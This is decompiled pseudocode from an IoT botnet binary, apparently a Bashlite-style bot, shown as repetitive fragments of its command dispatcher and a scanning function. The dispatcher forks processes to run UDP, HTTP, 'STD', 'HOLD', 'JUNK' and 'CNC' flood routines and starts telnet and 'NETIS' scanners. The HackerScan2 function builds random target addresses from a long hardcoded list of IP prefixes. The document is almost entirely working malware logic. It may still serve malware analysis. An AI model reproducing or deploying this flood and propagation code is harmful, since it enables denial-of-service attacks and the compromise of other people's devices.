                                                                                                        sendSTD(v239, v240, v241);
                                                                                                        sendHOLD(v239, v240, v241);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v232, v240, v241);
                                                                                                            sendSTD(v232, v240, v241);
                                                                                                            sendHOLD(v232, v240, v241);
                                                                                                            __libc_close((int32_t)v133);
                                                                                v214 = listFork();
                                                                                    sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                            v234 = listFork();
                                                                                                                sendJUNK(v239, v240, v241);
                                                                                                                sendSTD(v239, v240, v241);
                                                                                                                sendHOLD(v239, v240, v241);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v232, v240, v241);
                                                                                                                    sendSTD(v232, v240, v241);
                                                                                                                    sendHOLD(v232, v240, v241);
                                                                                                                    __libc_close((int32_t)v133);
                                                                                                        v217 = listFork();
                                                                                                            sendCNC(v226, v227, v228);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v229, v227, v228);
                                                                                                                __libc_close((int32_t)v133);
                                                                                                                            v234 = listFork();
                                                                                                                                sendJUNK(v239, v240, v241);
                                                                                                                                sendSTD(v239, v240, v241);
                                                                                                                                sendHOLD(v239, v240, v241);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendJUNK(v232, v240, v241);
                                                                                                                                    sendSTD(v232, v240, v241);
                                                                                                                                    sendHOLD(v232, v240, v241);
                                                                                                                                    __libc_close((int32_t)v133);
                                                                                            v215 = listFork();
                                                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                                    v234 = listFork();
                                                                                                                        sendJUNK(v239, v240, v241);
                                                                                                                        sendSTD(v239, v240, v241);
                                                                                                                        sendHOLD(v239, v240, v241);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v232, v240, v241);
                                                                                                                            sendSTD(v232, v240, v241);
                                                                                                                            sendHOLD(v232, v240, v241);
                                                                                                                            __libc_close((int32_t)v133);
                                                                                                                v217 = listFork();
                                                                                                                    sendCNC(v226, v227, v228);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v229, v227, v228);
                                                                                                                        __libc_close((int32_t)v133);
                                                                                                                                    v234 = listFork();
                                                                                                                                        sendJUNK(v239, v240, v241);
                                                                                                                                        sendSTD(v239, v240, v241);
                                                                                                                                        sendHOLD(v239, v240, v241);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendJUNK(v232, v240, v241);
                                                                                                                                            sendSTD(v232, v240, v241);
                                                                                                                                            sendHOLD(v232, v240, v241);
                                                                                                                                            __libc_close((int32_t)v133);
                                        v209 = _strncmp((char *)*a2, "UDP", 4);
                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v239, v240, v241);
                                                                            sendSTD(v239, v240, v241);
                                                                            sendHOLD(v239, v240, v241);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v232, v240, v241);
                                                                                sendSTD(v232, v240, v241);
                                                                                sendHOLD(v232, v240, v241);
                                                                                __libc_close((int32_t)v133);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v226, v227, v228);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v229, v227, v228);
                                                                            __libc_close((int32_t)v133);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v239, v240, v241);
                                                                                            sendSTD(v239, v240, v241);
                                                                                            sendHOLD(v239, v240, v241);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v232, v240, v241);
                                                                                                sendSTD(v232, v240, v241);
                                                                                                sendHOLD(v232, v240, v241);
                                                                                                __libc_close((int32_t)v133);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v226, v227, v228);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v229, v227, v228);
                                                                                    __libc_close((int32_t)v133);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v200, v177, v178, v179, v180, v148);
                                                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v226, v227, v228);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendCNC(v229, v227, v228);
                                                                                                            __libc_close((int32_t)v133);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v226, v227, v228);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendCNC(v229, v227, v228);
                                                                                                                    __libc_close((int32_t)v133);
                                    if (listFork() == 0) {
                                        sendHOLD(v167, v168, v169);
                                        while (true) {
                                            if (listFork() == 0) {
                                                sendHOLD(v311, v168, v169);
                                            v209 = _strncmp((char *)*a2, "UDP", 4);
                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        v217 = listFork();
                                                                            sendCNC(v226, v227, v228);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v229, v227, v228);
                                                                                __libc_close((int32_t)v133);
                                                            v215 = listFork();
                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                v217 = listFork();
                                                                                    sendCNC(v226, v227, v228);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v229, v227, v228);
                                                                                        __libc_close((int32_t)v133);
                                                                                v214 = listFork();
                                                                                    sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                        v217 = listFork();
                                                                                                            sendCNC(v226, v227, v228);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v229, v227, v228);
                                                                                                                __libc_close((int32_t)v133);
                                                                                            v215 = listFork();
                                                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                                v217 = listFork();
                                                                                                                    sendCNC(v226, v227, v228);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v229, v227, v228);
                                                                                                                        __libc_close((int32_t)v133);
                                                            if (listFork() == 0) {
                                                                sendJUNK(v170, v171, v172);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendJUNK(v199, v171, v172);
                                                                    __libc_close((int32_t)v133);
                                                            v209 = _strncmp((char *)*a2, "UDP", 4);
                                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                        v217 = listFork();
                                                                                            sendCNC(v226, v227, v228);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v229, v227, v228);
                                                                                                __libc_close((int32_t)v133);
                                                                            v215 = listFork();
                                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                v217 = listFork();
                                                                                                    sendCNC(v226, v227, v228);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v229, v227, v228);
                                                                                                        __libc_close((int32_t)v133);
                                                                                                v214 = listFork();
                                                                                                    sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                                        v217 = listFork();
                                                                                                                            sendCNC(v226, v227, v228);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendCNC(v229, v227, v228);
                                                                                                                                __libc_close((int32_t)v133);
                                                                                                            v215 = listFork();
                                                                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                                                v217 = listFork();
                                                                                                                                    sendCNC(v226, v227, v228);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendCNC(v229, v227, v228);
                                                                                                                                        __libc_close((int32_t)v133);
                                        v209 = _strncmp((char *)*a2, "UDP", 4);
                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v226, v227, v228);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v229, v227, v228);
                                                                            __libc_close((int32_t)v133);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v226, v227, v228);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v229, v227, v228);
                                                                                    __libc_close((int32_t)v133);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v200, v177, v178, v179, v180, v148);
                                                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                        if (listFork() == 0) {
                                                            sendJUNK(v170, v171, v172);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendJUNK(v199, v171, v172);
                                                                __libc_close((int32_t)v133);
                                                        v209 = _strncmp((char *)*a2, "UDP", 4);
                                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                        kill(v320, 9);
                        HackerPrint((int32_t)v133, (int32_t)" OFF");
                        v201 = _strncmp((char *)*a2, "NETIS", 6);
                                HackerPrint((int32_t)v133, (int32_t)"[NETIS] SCANNER Starting");
                                StartTheNetis();
                                v209 = _strncmp((char *)*a2, "UDP", 4);
                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                if (listFork() == 0) {
                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v176, v177, v178, v179, v180, v148);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendUDP(v200, v177, v178, v179, v180, v148);
                                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                if (listFork() == 0) {
                                                    sendJUNK(v170, v171, v172);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendJUNK(v199, v171, v172);
                                                        __libc_close((int32_t)v133);
                                                v209 = _strncmp((char *)*a2, "UDP", 4);
                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                            if (listFork() == 0) {
                                                sendHOLD(v167, v168, v169);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendHOLD(v198, v168, v169);
                                                v209 = _strncmp((char *)*a2, "UDP", 4);
                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v170, v171, v172);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v199, v171, v172);
                                                                        __libc_close((int32_t)v133);
                                                                v209 = _strncmp((char *)*a2, "UDP", 4);
                                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v176, v177, v178, v179, v180, v148);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendUDP(v200, v177, v178, v179, v180, v148);
                                                                                                    v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                            int32_t v324 = __libc_fork(3); // 0x8050126
                    HackerPrint((int32_t)v133, (int32_t)"TELNET ON | OFF");
            __GI_inet_ntoa(v325);
            HackerPrint((int32_t)v133, (int32_t)"My IP: %s");
        HackerPrint((int32_t)v133, (int32_t)"PONG!");
=================FUNCTION : HackerScan2 ===================
++++++++ FUNCTION START 6966
++++++++ FUNCTION END 8362
++++++++ FUNCTION LENGTH 1396
    int32_t v134 = random(); // 0x8049bc8
    int32_t v135 = random(); // 0x8049c08
    int32_t v136 = random(); // 0x8049c48
    int32_t v137 = random(); // 0x8049c88
    int32_t v138 = random() % 208; // 0x8049ce5
        szprintf(v140, (int32_t)"112.5.%d.%d", (int32_t)v132);
        szprintf(v141, (int32_t)"117.165.%d.%d", (int32_t)v132);
        szprintf(v142, (int32_t)"85.3.%d.%d", (int32_t)v132);
        szprintf(v143, (int32_t)"37.158.%d.%d", (int32_t)v132);
        szprintf(v144, (int32_t)"95.9.%d.%d", (int32_t)v132);
        szprintf(v145, (int32_t)"41.252.%d.%d", (int32_t)v132);
        szprintf(v146, (int32_t)"58.71.%d.%d", (int32_t)v132);
        szprintf(v147, (int32_t)"104.55.%d.%d", (int32_t)v132);
        szprintf(v148, (int32_t)"78.186.%d.%d", (int32_t)v132);
        szprintf(v149, (int32_t)"78.189.%d.%d", (int32_t)v132);
        szprintf(v150, (int32_t)"221.120.%d.%d", (int32_t)v132);
        szprintf(v151, (int32_t)"88.5.%d.%d", (int32_t)v132);
        szprintf(v152, (int32_t)"41.254.%d.%d", (int32_t)v132);
        szprintf(v153, (int32_t)"103.20.%d.%d", (int32_t)v132);
        szprintf(v154, (int32_t)"103.47.%d.%d", (int32_t)v132);
        szprintf(v155, (int32_t)"103.57.%d.%d", (int32_t)v132);
        szprintf(v156, (int32_t)"45.117.%d.%d", (int32_t)v132);
        szprintf(v157, (int32_t)"101.51.%d.%d", (int32_t)v132);
        szprintf(v158, (int32_t)"137.59.%d.%d", (int32_t)v132);
        szprintf(v159, (int32_t)"1.56.%d.%d", (int32_t)v132);
        szprintf(v160, (int32_t)"1.188.%d.%d", (int32_t)v132);
        szprintf(v161, (int32_t)"14.204.%d.%d", (int32_t)v132);
        szprintf(v162, (int32_t)"27.0.%d.%d", (int32_t)v132);
        szprintf(v163, (int32_t)"27.8.%d.%d", (int32_t)v132);
        szprintf(v164, (int32_t)"27.50.%d.%d", (int32_t)v132);
        szprintf(v165, (int32_t)"27.54.%d.%d", (int32_t)v132);
        szprintf(v166, (int32_t)"27.98.%d.%d", (int32_t)v132);
        szprintf(v167, (int32_t)"27.112.%d.%d", (int32_t)v132);
        szprintf(v168, (int32_t)"27.192.%d.%d", (int32_t)v132);
        szprintf(v169, (int32_t)"36.32.%d.%d", (int32_t)v132);
        szprintf(v170, (int32_t)"36.248.%d.%d", (int32_t)v132);
        szprintf(v171, (int32_t)"39.64.%d.%d", (int32_t)v132);
        szprintf(v172, (int32_t)"42.4.%d.%d", (int32_t)v132);
        szprintf(v173, (int32_t)"42.48.%d.%d", (int32_t)v132);
        szprintf(v174, (int32_t)"42.52.%d.%d", (int32_t)v132);
        szprintf(v175, (int32_t)"42.56.%d.%d", (int32_t)v132);
        szprintf(v176, (int32_t)"42.63.%d.%d", (int32_t)v132);
        szprintf(v177, (int32_t)"42.84.%d.%d", (int32_t)v132);
        szprintf(v178, (int32_t)"42.176.%d.%d", (int32_t)v132);
        szprintf(v179, (int32_t)"42.224.%d.%d", (int32_t)v132);
        szprintf(v180, (int32_t)"42.176.%d.%d", (int32_t)v132);
        szprintf(v181, (int32_t)"43.253.%d.%d", (int32_t)v132);
        szprintf(v182, (int32_t)"43.230.%d.%d", (int32_t)v132);
        szprintf(v183, (int32_t)"163.53.%d.%d", (int32_t)v132);
        szprintf(v184, (int32_t)"43.230.%d.%d", (int32_t)v132);
        szprintf(v185, (int32_t)"62.252.%d.%d", (int32_t)v132);
        szprintf(v186, (int32_t)"43.245.%d.%d", (int32_t)v132);
        szprintf(v187, (int32_t)"62.255.%d.%d", (int32_t)v132);
        szprintf(v188, (int32_t)"123.25.%d.%d", (int32_t)v132);
        szprintf(v189, (int32_t)"103.54.%d.%d", (int32_t)v132);
        szprintf(v190, (int32_t)"27.255.%d.%d", (int32_t)v132);
        szprintf(v191, (int32_t)"103.204.%d.%d", (int32_t)v132);
        szprintf(v192, (int32_t)"123.24.%d.%d", (int32_t)v132);
        szprintf(v193, (int32_t)"113.191.%d.%d", (int32_t)v132);
        szprintf(v194, (int32_t)"81.100.%d.%d", (int32_t)v132);
        szprintf(v195, (int32_t)"113.188.%d.%d", (int32_t)v132);
        szprintf(v196, (int32_t)"113.189.%d.%d", (int32_t)v132);
        szprintf(v197, (int32_t)"94.174.%d.%d", (int32_t)v132);
        szprintf(v198, (int32_t)"14.160.%d.%d", (int32_t)v132);
        szprintf(v199, (int32_t)"14.161.%d.%d", (int32_t)v132);
        szprintf(v200, (int32_t)"14.162.%d.%d", (int32_t)v132);
        szprintf(v201, (int32_t)"14.163.%d.%d", (int32_t)v132);
        szprintf(v202, (int32_t)"14.164.%d.%d", (int32_t)v132);
        szprintf(v203, (int32_t)"14.165.%d.%d", (int32_t)v132);
        szprintf(v204, (int32_t)"14.166.%d.%d", (int32_t)v132);
        szprintf(v205, (int32_t)"14.167.%d.%d", (int32_t)v132);
        szprintf(v206, (int32_t)"14.168.%d.%d", (int32_t)v132);
        szprintf(v207, (int32_t)"14.169.%d.%d", (int32_t)v132);
        szprintf(v208, (int32_t)"14.170.%d.%d", (int32_t)v132);
        szprintf(v209, (int32_t)"14.171.%d.%d", (int32_t)v132);
        szprintf(v210, (int32_t)"14.172.%d.%d", (int32_t)v132);
        szprintf(v211, (int32_t)"14.173.%d.%d", (int32_t)v132);
        szprintf(v212, (int32_t)"14.174.%d.%d", (int32_t)v132);
        szprintf(v213, (int32_t)"14.175.%d.%d", (int32_t)v132);
        szprintf(v214, (int32_t)"14.176.%d.%d", (int32_t)v132);
        szprintf(v215, (int32_t)"14.177.%d.%d", (int32_t)v132);
        szprintf(v216, (int32_t)"14.178.%d.%d", (int32_t)v132);
        szprintf(v217, (int32_t)"14.179.%d.%d", (int32_t)v132);
        szprintf(v218, (int32_t)"14.180.%d.%d", (int32_t)v132);
        szprintf(v219, (int32_t)"14.181.%d.%d", (int32_t)v132);
        szprintf(v220, (int32_t)"14.182.%d.%d", (int32_t)v132);
        szprintf(v221, (int32_t)"14.183.%d.%d", (int32_t)v132);
        szprintf(v222, (int32_t)"14.184.%d.%d", (int32_t)v132);
        szprintf(v223, (int32_t)"14.185.%d.%d", (int32_t)v132);
        szprintf(v224, (int32_t)"14.186.%d.%d", (int32_t)v132);
        szprintf(v225, (int32_t)"14.187.%d.%d", (int32_t)v132);
        szprintf(v226, (int32_t)"14.188.%d.%d", (int32_t)v132);
        szprintf(v227, (int32_t)"14.189.%d.%d", (int32_t)v132);
        szprintf(v228, (int32_t)"14.190.%d.%d", (int32_t)v132);
        szprintf(v229, (int32_t)"14.191.%d.%d", (int32_t)v132);
        szprintf(v230, (int32_t)"45.121.%d.%d", (int32_t)v132);
        szprintf(v231, (int32_t)"45.120.%d.%d", (int32_t)v132);
        szprintf(v232, (int32_t)"45.115.%d.%d", (int32_t)v132);
        szprintf(v233, (int32_t)"43.252.%d.%d", (int32_t)v132);
        szprintf(v234, (int32_t)"43.230.%d.%d", (int32_t)v132);
        szprintf(v235, (int32_t)"43.240.%d.%d", (int32_t)v132);
        szprintf(v236, (int32_t)"43.245.%d.%d", (int32_t)v132);
        szprintf(v237, (int32_t)"41.174.%d.%d", (int32_t)v132);
        szprintf(v238, (int32_t)"49.118.%d.%d", (int32_t)v132);
        szprintf(v239, (int32_t)"78.188.%d.%d", (int32_t)v132);
        szprintf(v240, (int32_t)"45.127.%d.%d", (int32_t)v132);
        szprintf(v241, (int32_t)"103.30.%d.%d", (int32_t)v132);
        szprintf(v242, (int32_t)"14.33.%d.%d", (int32_t)v132);
        szprintf(v243, (int32_t)"123.16.%d.%d", (int32_t)v132);
        szprintf(v244, (int32_t)"202.44.%d.%d", (int32_t)v132);
        szprintf(v245, (int32_t)"116.93.%d.%d", (int32_t)v132);
        szprintf(v246, (int32_t)"91.83.%d.%d", (int32_t)v132);
        szprintf(v247, (int32_t)"41.253.%d.%d", (int32_t)v132);
        szprintf(v248, (int32_t)"117.173.%d.%d", (int32_t)v132);
        szprintf(v249, (int32_t)"113.190.%d.%d", (int32_t)v132);
        szprintf(v250, (int32_t)"146.88.%d.%d", (int32_t)v132);
        szprintf(v251, (int32_t)"112.196.%d.%d", (int32_t)v132);
        szprintf(v252, (int32_t)"113.178.%d.%d", (int32_t)v132);
        szprintf(v253, (int32_t)"112.45.%d.%d", (int32_t)v132);
        szprintf(v254, (int32_t)"183.223.%d.%d", (int32_t)v132);
        szprintf(v255, (int32_t)"116.71.%d.%d", (int32_t)v132);
        szprintf(v256, (int32_t)"103.44.%d.%d", (int32_t)v132);
        szprintf(v257, (int32_t)"110.235.%d.%d", (int32_t)v132);
        szprintf(v258, (int32_t)"124.253.%d.%d", (int32_t)v132);
        szprintf(v259, (int32_t)"211.237.%d.%d", (int32_t)v132);
        szprintf(v260, (int32_t)"117.175.%d.%d", (int32_t)v132);
        szprintf(v261, (int32_t)"117.173.%d.%d", (int32_t)v132);
        szprintf(v262, (int32_t)"178.93.%d.%d", (int32_t)v132);
        szprintf(v263, (int32_t)"111.9.%d.%d", (int32_t)v132);
        szprintf(v264, (int32_t)"222.252.%d.%d", (int32_t)v132);
        szprintf(v265, (int32_t)"113.174.%d.%d", (int32_t)v132);
        szprintf(v266, (int32_t)"222.252.%d.%d", (int32_t)v132);
        szprintf(v267, (int32_t)"113.160.%d.%d", (int32_t)v132);
        szprintf(v268, (int32_t)"113.161.%d.%d", (int32_t)v132);
        szprintf(v269, (int32_t)"113.162.%d.%d", (int32_t)v132);
        szprintf(v270, (int32_t)"113.163.%d.%d", (int32_t)v132);
        szprintf(v271, (int32_t)"113.164.%d.%d", (int32_t)v132);
        szprintf(v272, (int32_t)"113.165.%d.%d", (int32_t)v132);
        szprintf(v273, (int32_t)"113.166.%d.%d", (int32_t)v132);
        szprintf(v274, (int32_t)"113.167.%d.%d", (int32_t)v132);
        szprintf(v275, (int32_t)"113.168.%d.%d", (int32_t)v132);
        szprintf(v276, (int32_t)"113.169.%d.%d", (int32_t)v132);
        szprintf(v277, (int32_t)"123.17.%d.%d", (int32_t)v132);
        szprintf(v278, (int32_t)"123.18.%d.%d", (int32_t)v132);
        szprintf(v279, (int32_t)"123.19.%d.%d", (int32_t)v132);
        szprintf(v280, (int32_t)"123.20.%d.%d", (int32_t)v132);
        szprintf(v281, (int32_t)"123.21.%d.%d", (int32_t)v132);
        szprintf(v282, (int32_t)"123.22.%d.%d", (int32_t)v132);
        szprintf(v283, (int32_t)"222.252.%d.%d", (int32_t)v132);
        szprintf(v284, (int32_t)"222.253.%d.%d", (int32_t)v132);
        szprintf(v285, (int32_t)"222.254.%d.%d", (int32_t)v132);
        szprintf(v286, (int32_t)"222.255.%d.%d", (int32_t)v132);
        szprintf(v287, (int32_t)"37.247.%d.%d", (int32_t)v132);
        szprintf(v288, (int32_t)"41.208.%d.%d", (int32_t)v132);
        szprintf(v289, (int32_t)"183.220.%d.%d", (int32_t)v132);
        szprintf(v290, (int32_t)"175.201.%d.%d", (int32_t)v132);
        szprintf(v291, (int32_t)"103.198.%d.%d", (int32_t)v132);
        szprintf(v292, (int32_t)"183.223.%d.%d", (int32_t)v132);
        szprintf(v293, (int32_t)"50.205.%d.%d", (int32_t)v132);
        szprintf(v294, (int32_t)"88.248.%d.%d", (int32_t)v132);
        szprintf(v295, (int32_t)"88.105.%d.%d", (int32_t)v132);
        szprintf(v296, (int32_t)"88.247.%d.%d", (int32_t)v132);
        szprintf(v297, (int32_t)"85.105.%d.%d", (int32_t)v132);
        szprintf(v298, (int32_t)"188.3.%d.%d", (int32_t)v132);
        szprintf(v299, (int32_t)"103.203.%d.%d", (int32_t)v132);
        szprintf(v300, (int32_t)"103.55.%d.%d", (int32_t)v132);
        szprintf(v301, (int32_t)"103.220.%d.%d", (int32_t)v132);
        szprintf(v302, (int32_t)"183.233.%d.%d", (int32_t)v132);
        szprintf(v303, (int32_t)"103.242.%d.%d", (int32_t)v132);
        szprintf(v304, (int32_t)"103.198.%d.%d", (int32_t)v132);
        szprintf(v305, (int32_t)"103.14.%d.%d", (int32_t)v132);
        szprintf(v306, (int32_t)"103.195.%d.%d", (int32_t)v132);
        szprintf(v307, (int32_t)"103.203.%d.%d", (int32_t)v132);
        szprintf(v308, (int32_t)"103.214.%d.%d", (int32_t)v132);
        szprintf(v309, (int32_t)"103.218.%d.%d", (int32_t)v132);
        szprintf(v310, (int32_t)"103.225.%d.%d", (int32_t)v132);
        szprintf(v311, (int32_t)"103.228.%d.%d", (int32_t)v132);
        szprintf(v312, (int32_t)"103.231.%d.%d", (int32_t)v132);
        szprintf(v313, (int32_t)"103.60.%d.%d", (int32_t)v132);
        szprintf(v314, (int32_t)"103.248.%d.%d", (int32_t)v132);
        szprintf(v315, (int32_t)"103.253.%d.%d", (int32_t)v132);
